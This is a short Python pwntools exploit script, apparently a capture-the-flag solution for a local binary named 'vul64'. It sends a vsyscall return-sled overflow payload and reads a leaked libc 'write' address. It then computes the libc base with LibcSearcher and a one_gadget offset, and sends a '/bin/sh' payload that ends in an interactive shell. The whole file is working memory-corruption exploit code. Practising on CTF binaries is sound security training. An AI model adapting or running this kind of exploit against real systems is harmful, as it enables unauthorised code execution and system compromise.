#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
from LibcSearcher import *
import os
import time
import struct
context(arch = "amd64",os = "linux", log_level = "debug")

# context.log_level = "debug"
p = process('./vul64')
elf = ELF('./vul64')

#gdb.attach(p, "break *0x0000555555554a2b")

#time.sleep(10)
ret_addr = 0xffffffffff600400

with open('input.txt', 'w') as f:
    f.write(p64(ret_addr) * 30 + '\x2c')

p.send(p64(ret_addr) * 30 + '\x2c')
p.recvuntil("I have a gift for yoooou\n")
write_libc = u64(p.recv(8))
p.recvuntil("Want my flag? Keep going!\n")

libc = LibcSearcher('write', write_libc)
libc_base = write_libc - libc.dump('write')
system_libc = libc_base + 0x4f3d5 # one_gadget Shift


p.send("/bin/sh\x00" + '0' * 0x2f + p32(0x44) + p64(system_libc)  + '\n')
p.interactive()
